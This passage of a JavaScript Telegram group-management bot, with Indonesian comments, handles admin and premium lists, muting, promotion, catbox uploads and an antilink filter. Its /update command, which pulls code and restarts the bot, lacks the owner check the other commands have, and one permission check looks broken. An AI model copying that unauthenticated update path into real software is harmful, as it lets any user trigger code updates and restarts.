    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `⚡ User ${userId} is not in the regis list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🔥 User ${userId} has been removed from the prem list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "⚡ Missing input. Please provide a user ID. Example: /deladmin 8246978365.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "⚡ Invalid input. Example: /deladmin 8246978365.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `⚡ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/groupAktip/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(true); // Aktifkan mode hanya grup
        await bot.sendMessage(chatId, "✅ Mode hanya grup diaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat mengaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengaktifkan mode hanya grup.");
    }
});

// Command untuk menonaktifkan mode hanya grup
bot.onText(/\/groupNonaktif/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
    
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(false); // Nonaktifkan mode hanya grup
        await bot.sendMessage(chatId, "✅ Mode hanya grup dinonaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat menonaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menonaktifkan mode hanya grup.");
    }
});
bot.onText(/\/addgroup/, async (msg) => {

    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }

    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
    { parse_mode: "Markdown" }
  );
}

        addGroupToAllowed(chatId); // Gunakan chatId dari grup tempat perintah dikeluarkan
    } catch (error) {
        console.error('Error adding group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menambahkan grup.');
    }
});

// Perintah /delgroup (menghapus grup tempat perintah dikeluarkan)
bot.onText(/\/delgroup/, async (msg) => {
    
    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
            { parse_mode: "Markdown" }
        );
    }

        removeGroupFromAllowed(chatId); // Gunakan chatId dari grup tempat perintah dikeluarkan
    } catch (error) {
        console.error('Error deleting group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menghapus grup.');
    }
});

bot.onText(/^\/delsesi$/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!OWNER_ID.includes(String(senderId))) {
    return bot.sendMessage(chatId, "❌ Lu bukan owner.");
  }

  try {
    if (fs.existsSync(SESSIONS_DIR)) {
      fs.rmSync(SESSIONS_DIR, { recursive: true, force: true });
    }
    fs.mkdirSync(SESSIONS_DIR, { recursive: true });

    if (fs.existsSync(SESSIONS_FILE)) {
      fs.unlinkSync(SESSIONS_FILE);
    }

    bot.sendMessage(chatId, "✅ Semua sesi berhasil dihapus.");
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal menghapus sesi.");
  }
});

bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Proses Auto Update");

    try {
        await downloadRepo("");
        bot.sendMessage(chatId, "✅ Update selesai!\n🔁 Bot restart otomatis.");

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update, cek repo GitHub atau koneksi.");
        console.error(e);
    }
});

bot.onText(/^\/restart$/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!OWNER_ID.includes(String(senderId))) {
    return bot.sendMessage(chatId, "❌ Lu bukan owner.");
  }

  await bot.sendMessage(chatId, "♻️ Restarting bot...");

  setTimeout(() => {
    const args = [...process.argv.slice(1), "--restarted-from", String(chatId)];
    const child = exec(process.argv[0], args, {
      detached: true,
      stdio: "inherit",
    });
    child.unref();
    process.exit(0);
  }, 1000);
});

bot.onText(/\/listgroup/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "⛔ Fitur ini hanya untuk owner atau admin.");
  }

  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    if (!groupIds.length) {
      return bot.sendMessage(chatId, "📭 Belum ada grup yang ditambahkan.");
    }

    let text = `📋 *Daftar Grup yang Diizinkan:*\n\n`;

    for (const id of groupIds) {
      try {
        const chat = await bot.getChat(id);
        const title = chat.title || 'Tidak diketahui';
        text += `🔹 *${title}*\n🆔 \`${id}\`\n\n`;
      } catch {
        text += `⚠️ [Gagal ambil info] ID: \`${id}\`\n\n`;
      }
    }

    bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal membaca daftar grup:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membaca daftar grup.");
  }
});


// === /DEMOTE ADMIN DI TELEGRAM ===
bot.onText(/^\/demote$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (String(senderId) !== String(OWNER_ID)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa pake perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply) return bot.sendMessage(chatId, "❌ Balas pesan user yang mau di-demote.");

  const userId = reply.from.id;

  try {
    await bot.promoteChatMember(chatId, userId, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: false,
      can_promote_members: false
    });

    bot.sendMessage(chatId, `✅ Sukses demote [user](tg://user?id=${userId}).`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal demote: ${err.message}`);
  }
});
// === /PROMOTE DENGAN CUSTOM ADMIN TITLE DI TELEGRAM ===
bot.onText(/^\/promote(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (String(senderId) !== String(OWNER_ID)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa pake perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply) return bot.sendMessage(chatId, "❌ Balas pesan user yang mau di-promote.");

  const userId = reply.from.id;
  const label = match[1]?.trim();

  try {
    // Step 1: promote
    await bot.promoteChatMember(chatId, userId, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: true,
      can_promote_members: false
    });

    // Step 2: kalau ada label, set sebagai custom admin title
    if (label) {
      await bot.setChatAdministratorCustomTitle(chatId, userId, label);
    }

    const name = reply.from.username ? `@${reply.from.username}` : `[user](tg://user?id=${userId})`;
    const status = label ? `\`${label}\`` : "*Admin*";

    bot.sendMessage(chatId, `✅ ${name} sekarang jadi ${status}`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal promote: ${err.message}`);
  }
});
// perintah untuk open dan close group
bot.onText(/^\/(open|close)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1].toLowerCase();
  const userId = msg.from.id;
  
  // Cek apakah di grup
  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya bisa di grup Telegram!');
  }

  // Cek apakah pengirim admin
  try {
    const admins = await bot.getChatAdministrators(chatId);
    const isOwner = admins.some(admin => admin.user.id === userId);
    if (!isOwner) return bot.sendMessage(chatId, '❌ Lu bukan admin bang!');

    if (command === 'close') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: false
      });
      return bot.sendMessage(chatId, '🔒 Grup telah *dikunci*! Hanya admin yang bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

    if (command === 'open') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false
      });
      return bot.sendMessage(chatId, '🔓 Grup telah *dibuka*! Semua member bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

  } catch (err) {
    console.error('Gagal atur izin:', err);
    return bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengatur grup.');
  }
});

bot.onText(/\/X/, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ Balas pesan yang ingin dihapus dengan perintah /X.");
  }

  // Cek izin
  const isGroup = msg.chat.type.includes("group");
  const isAllowed = isGroup ? await isOwner(chatId, fromId) || isOwner(fromId) : true;

  if (!isAllowed) {
    return bot.sendMessage(chatId, "⛔ Hanya admin/owner yang bisa menghapus pesan ini.");
  }

  const targetMessageId = msg.reply_to_message.message_id;

  try {
    await bot.deleteMessage(chatId, targetMessageId);           // hapus pesan target
    await bot.deleteMessage(chatId, msg.message_id);            // hapus command /X
  } catch (err) {
    console.error("Gagal hapus:", err.message);
    bot.sendMessage(chatId, "⚠️ Gagal menghapus pesan.");
  }
});

// === MUTE ===
bot.onText(/\/mute(?:\s+(\d+[a-zA-Z]+|selamanya))?/, async (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @joyyyclod.",
            { parse_mode: "Markdown" }
        );
    }
  
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  let duration = 60; // default 60 detik
  const raw = match[1];

  if (raw) {
    if (raw.toLowerCase() === 'selamanya') {
      duration = 60 * 60 * 24 * 365 * 100; // 100 tahun
    } else {
      const regex = /^(\d+)(s|m|h|d|w|mo|y)$/i;
      const parts = raw.match(regex);
      if (parts) {
        const value = parseInt(parts[1]);
        const unit = parts[2].toLowerCase();
        const unitMap = { s: 1, m: 60, h: 3600, d: 86400, w: 604800, mo: 2592000, y: 31536000 };
        duration = value * (unitMap[unit] || 60);
      }
    }
  }

  const targetId = msg.reply_to_message?.from?.id;
  if (!targetId) return bot.sendMessage(chatId, "❌ Gunakan reply ke user untuk mute.");

  try {
    const until = Math.floor(Date.now() / 1000) + duration;
    await bot.restrictChatMember(chatId, targetId, {
      can_send_messages: false,
      until_date: until,
    });
    bot.sendMessage(chatId, `🔇 User dimute selama ${raw || '60s'} (${duration} detik)`);
  } catch {
    bot.sendMessage(chatId, "❌ Gagal mute user.");
  }
});

// === UNMUTE ===
bot.onText(/\/unmute/, async (msg) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @joyyyclod.",
            { parse_mode: "Markdown" }
        );
    }


  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  const targetId = msg.reply_to_message?.from?.id;
  if (!targetId) return bot.sendMessage(chatId, "❌ Gunakan reply ke user untuk unmute.");

  try {
    await bot.restrictChatMember(chatId, targetId, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
    });
    bot.sendMessage(chatId, `🔊 User telah di-unmute.`);
  } catch {
    bot.sendMessage(chatId, "❌ Gagal unmute user.");
  }
});


bot.onText(/\/info/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username;

    if (shouldIgnoreMessage(msg)) return;

    const repliedMessage = msg.reply_to_message;

    //--- PERUBAHAN: Cek apakah ada balasan (reply) ---
    if (!repliedMessage) {
       
        const replyOptions = {
            reply_to_message_id: msg.message_id, 
            parse_mode: 'Markdown',              
        };
        try {
            await bot.sendMessage(
                chatId,
                `
╭━━「 INFO KAMU 」⬣
×͜× Username: ${username ? `@${username}` : 'Tidak ada'}
×͜× ID: \`${senderId}\`
╰────────────────⬣
`,
                replyOptions
            );
        } catch (error) {
            console.error("Error saat mengirim pesan:", error);
            await bot.sendMessage(chatId, "⚠️  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });

        }
        return; // Hentikan eksekusi lebih lanjut
    }

    //--- KODE SEBELUMNYA UNTUK BALASAN PESAN (TIDAK ADA PERUBAHAN DI SINI) ---
    const repliedUserId = repliedMessage.from?.id;

    if (!repliedMessage.from) {
        const errorMessage = "⚠️  Pesan yang Anda balas tidak memiliki informasi pengirim.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }

    if (!repliedUserId) {
        const errorMessage = "⚠️  Pesan yang Anda balas tidak memiliki ID pengguna.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }
    const repliedUsername = repliedMessage.from.username;
    const repliedFirstName = repliedMessage.from.first_name;
    const repliedLastName = repliedMessage.from.last_name;
    const repliedFullName = repliedFirstName + (repliedLastName ? ` ${repliedLastName}` : '');

    const replyOptions = {
        reply_to_message_id: msg.message_id,
        parse_mode: 'Markdown',
    };

    try {
        await bot.sendMessage(
            chatId,
            `
╭━━「 INFO PENGGUNA 」━━━⬣
×͜× Username: ${repliedUsername ? `@${repliedUsername}` : 'Tidak ada'}
×͜× ID: \`${repliedUserId}\`
×͜× Nama: \`${repliedFullName}\`
╰────────────────⬣
*Diminta oleh* [${username ? `@${username}` : 'Anda'}]`,
            replyOptions
        );
    } catch (error) {
        console.error("Error saat mengirim pesan:", error);
        await bot.sendMessage(chatId, "⚠️  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });
    }
});

// to url
async function CatBox(path) {
    const data = new FormData();
    data.append('reqtype', 'fileupload');
    data.append('userhash', '');
    data.append('fileToUpload', fs.createReadStream(path));

    // Perbaiki: Gunakan data.getHeaders() dengan benar
    const config = {
        method: 'POST',
        url: 'https://catbox.moe/user/api.php',
        headers: data.getHeaders(), // Gunakan getHeaders() di sini
        data: data
    };
    const api = await axios.request(config);
    return api.data;
}

// Handler perintah /tourl
function getFileExtension(contentType) {
    if (!contentType) {
        return '.bin'; // Default jika jenis konten tidak diketahui
    }
    if (contentType.includes('image/jpeg') || contentType.includes('image/jpg')) {
        return '.jpg';
    } else if (contentType.includes('image/png')) {
        return '.png';
    } else if (contentType.includes('image/gif')) {
        return '.gif';
    } else if (contentType.includes('video/mp4')) {
        return '.mp4';
    } else if (contentType.includes('video/quicktime')) {
        return '.mov'; // Contoh untuk video quicktime
    } else if (contentType.includes('audio/mpeg')) {
        return '.mp3';
    } else if (contentType.includes('audio/ogg')) {
        return '.ogg';
    } else if (contentType.includes('application/pdf')) {
        return '.pdf';
    } else if (contentType.includes('application/zip')) {
        return '.zip';
    } else {
        return '.bin'; // Default atau gunakan '.dat', dll.
    }
}


// Handler perintah /tourl
bot.onText(/\/tourl/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const message = msg;
if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`Lu bukan penguna premium\`\`\`
Minta akses sana ke Bos gua
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝙤𝙬𝙣𝙚𝙧", url: "https://t.me/joyyyclod" }]
      ]
    }
  });
}
        if (message.reply_to_message) {
            const repliedMessage = message.reply_to_message;
            let fileId;
            let contentType; // Tambahkan untuk menyimpan jenis konten

            if (repliedMessage.photo) {
                fileId = repliedMessage.photo[repliedMessage.photo.length - 1].file_id;
                contentType = 'image/jpeg';  // Default untuk foto, Anda mungkin perlu logika tambahan jika ada beberapa ukuran
            } else if (repliedMessage.video) {
                fileId = repliedMessage.video.file_id;
                contentType = 'video/mp4'; // Default untuk video
            } else if (repliedMessage.document) {
                fileId = repliedMessage.document.file_id;
                contentType = repliedMessage.document.mime_type; // Ambil jenis konten dari dokumen
            } else if (repliedMessage.audio) {
                fileId = repliedMessage.audio.file_id;
                contentType = repliedMessage.audio.mime_type; // Ambil jenis konten dari audio
            } else {
                return bot.sendMessage(chatId, 'Silakan reply pesan yang berisi foto, video, dokumen, atau audio dengan perintah /tourl.');
            }

            // Unduh file dari Telegram
            const fileInfo = await bot.getFile(fileId);
            const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
            const response = await axios.get(fileLink, { responseType: 'stream' });

            // Dapatkan ekstensi file
            const fileExtension = getFileExtension(contentType);
            // Buat nama file dengan ekstensi yang benar
            const filePath = `./temp_${Date.now()}${fileExtension}`;

            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);

            await new Promise((resolve, reject) => {
                writer.on('finish', resolve);
                writer.on('error', reject);
            });

            // Unggah file ke CatBox
            const catBoxUrl = await CatBox(filePath);
            const result = `📦 *CatBox*: ${catBoxUrl || '-'}\n
            ᴄʀᴇᴀᴛᴇ ʙʏ ᴅʀᴀɢᴏɴ⸙`;
            bot.sendMessage(chatId, result, { parse_mode: 'Markdown', reply_to_message_id: repliedMessage.message_id });

            // Hapus file sementara
            fs.unlinkSync(filePath);

        } else {
            return bot.sendMessage(chatId, 'Silakan reply pesan yang berisi foto, video, dokumen, atau audio dengan perintah /tourl.');
        }

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses file.');
    }
});

// === ANTILINK ON/OFF ===
bot.onText(/\/antilink (on|off)/, (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @joyyyclod.",
            { parse_mode: "Markdown" }
        );
    }
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  const status = match[1].toLowerCase() === "on";
  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].antilink = status;
  saveGroupSettings();

  bot.sendMessage(chatId, `🔗 Antilink *${status ? 'AKTIF' : 'NONAKTIF'}*`, { parse_mode: "Markdown" });
});

// === ZETTA GUARD – FITUR ADD MEMBER + LINK SEKALI PAKAI ===
bot.onText(/\/add\s+@?(\w+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1];
  const senderId = msg.from.id;

  if (!msg.chat.type.includes('group')) return;

  try {
    const admin = await bot.getChatMember(chatId, senderId);
    if (!['creator', 'administrator'].includes(admin.status)) {
      return bot.sendMessage(chatId, '❌ Hanya admin yang bisa pakai perintah ini.');
    }
  } catch (e) {
    return bot.sendMessage(chatId, '⚠️ Gagal verifikasi admin.');
  }

  try {
    const invite = await bot.createChatInviteLink(chatId, {
      expire_date: Math.floor(Date.now() / 1000) + 3600, // 1 jam dari sekarang
      member_limit: 1 // hanya 1 orang bisa pakai
    });

    const text = `📨 *Link undangan khusus untuk @${username}*\n\n` +
                 `📋 *Salin & kirim ke dia:*\n` +
                 `🎟️ Nih link buat lu join grup (1x pakai, berlaku 1 jam):\n${invite.invite_link}\n\n` +
                 `💬 *Atau langsung chat @${username} dari tombol di bawah ini*`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[
          { text: `💬 Chat @${username}`, url: `https://t.me/${username}` }
        ]]
      }
    };

    bot.sendMessage(chatId, text, opts);
  } catch (err) {
    console.error('[ADD INVITE ONCE ERROR]', err.message);
    bot.sendMessage(chatId, '⚠️ Gagal membuat link sekali pakai. Pastikan bot admin & punya izin membuat link undangan.');
  }
});

// === SET WELCOME ===
bot.onText(/\/setwelcome (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @joyyyclod.",
            { parse_mode: "Markdown" }
        );
    }
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].welcome = match[1];
  saveGroupSettings();

  bot.sendMessage(chatId, "✅ Pesan welcome disimpan!");
});

// === SET LEAVE ===
bot.onText(/\/setleave (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @joyyyclod.",
            { parse_mode: "Markdown" }
        );
    }
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].leave = match[1];
  saveGroupSettings();

  bot.sendMessage(chatId, "✅ Pesan leave disimpan!");
});

// === WELCOME AUTO ===
bot.on('new_chat_members', (msg) => {
  const chatId = msg.chat.id;
  const setting = groupSettings[chatId];
  if (!setting?.welcome) return;

  const name = msg.new_chat_members[0]?.first_name || 'user';
  const text = setting.welcome.replace('{name}', name);
  bot.sendMessage(chatId, text);
});

// === LEAVE AUTO ===
bot.on('left_chat_member', (msg) => {
  const chatId = msg.chat.id;
  const setting = groupSettings[chatId];
  if (!setting?.leave) return;

  const name = msg.left_chat_member?.first_name || 'user';
  const text = setting.leave.replace('{name}', name);
  bot.sendMessage(chatId, text);
});

// === ANTILINK DETEKSI ===
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text || msg.caption || "";

  // ✅ Cek apakah fitur antilink aktif di grup ini
  if (!groupSettings[chatId]?.antilink) return;

  const pattern = /(?:https?:\/\/|t\.me\/|chat\.whatsapp\.com|wa\.me\/|@\w+)/i;
  if (pattern.test(text)) {
    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
  }
});